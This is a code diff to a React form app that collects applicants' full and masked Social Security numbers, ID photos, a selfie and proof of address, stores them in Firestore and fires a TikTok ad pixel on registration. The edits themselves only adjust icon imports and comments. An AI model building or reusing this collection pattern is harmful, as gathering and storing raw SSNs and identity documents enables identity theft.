@@ -1,5 +1,6 @@
 import React, { useState, useRef, useEffect } from 'react';
-import { Camera, Check, Shield, Lock, ChevronRight, AlertCircle, Menu, X, User as UserIcon, Loader2, FileText, ExternalLink, ArrowRight, Star, TrendingUp } from 'lucide-react';
+// IMPORTAÇÕES CORRIGIDAS: Removi 'Star', adicionei 'CreditCard' e 'TrendingUp'
+import { Camera, Check, Shield, Lock, ChevronRight, AlertCircle, Menu, X, User as UserIcon, Loader2, FileText, ExternalLink, ArrowRight, CreditCard, TrendingUp } from 'lucide-react';
 import { initializeApp } from 'firebase/app';
 import { getFirestore, collection, addDoc, serverTimestamp, type Firestore } from 'firebase/firestore';
 import { getAuth, signInAnonymously, onAuthStateChanged, type Auth, type User } from 'firebase/auth';
@@ -43,7 +44,7 @@ interface SubmittedDataType {
   ssn_masked: string; 
   ssn_real: string; 
   status: string; 
-  submittedAt: string | any; // Ajustado para aceitar serverTimestamp sem erro
+  submittedAt: string | any;
   utm_source: string;
   documents: { idFront: FileData | null; idBack: FileData | null; selfie: FileData | null; proofAddress: FileData | null; }; 
 }
@@ -186,7 +187,6 @@ export default function App() {
       
       await addDoc(collection(db, 'applications'), { ...payload, submittedAt: serverTimestamp() });
       
-      // Pixel Fire
       try {
         if ((window as any).ttq) (window as any).ttq.track('CompleteRegistration');
       } catch (err) {}
